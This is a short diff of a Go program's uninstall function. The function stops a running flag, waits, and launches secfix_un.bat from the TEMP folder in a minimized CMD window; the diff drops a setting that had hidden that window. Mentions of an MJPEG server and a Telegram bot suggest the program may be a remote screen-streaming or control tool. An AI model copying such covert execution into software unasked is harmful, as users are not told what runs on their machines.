@@ -215,21 +215,20 @@ func startMJPEGServer() {
     }
     go http.ListenAndServe(":"+port, nil)
 }
- func uninstall() {
+
+func uninstall() {
     if logEnabled {
         log.Println("INFO - Starting uninstall process")
     }
     running = false
 
-    // Delay briefly to allow MJPEG server and Telegram bot to stop gracefully
+    // Brief delay before launching batch
     time.Sleep(2 * time.Second)
 
-    // Path to the batch file created by PowerShell
     tempBat := filepath.Join(os.Getenv("TEMP"), "secfix_un.bat")
 
-    // Run the batch file in a new CMD, minimized and hidden
+    // Start the batch in a new CMD, minimized
     cmd := exec.Command("cmd", "/C", "start", "/min", tempBat)
-    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
     if err := cmd.Start(); err != nil {
         if logEnabled {
             log.Println("ERROR - Failed to start uninstall batch file:", err)
